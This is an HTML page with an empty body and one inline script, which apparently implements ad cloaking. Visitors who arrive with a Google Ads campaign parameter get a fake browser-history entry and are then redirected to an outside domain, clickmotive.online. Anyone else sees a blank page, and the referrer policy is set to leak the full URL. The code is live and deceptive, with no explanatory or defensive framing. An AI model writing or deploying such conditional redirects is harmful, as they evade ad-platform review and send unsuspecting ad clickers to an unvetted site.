<html>
  <head>
    <meta charset="utf-8" />
    <meta name="referrer" content="unsafe-url" />
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        function hasUtmSource() {
          const urlParams = new URLSearchParams(window.location.search);
          return urlParams.has("gad_campaignid");
        }

        function redirectToNewPage() {
          history.pushState(
            {},
            "Article",
            "/about.html/",
          );

          window.location.href = `https://clickmotive.online/`;
        }

        if (hasUtmSource()) {
          redirectToNewPage();
        }
      });
    </script>
  </head>
  <body></body>
</html>
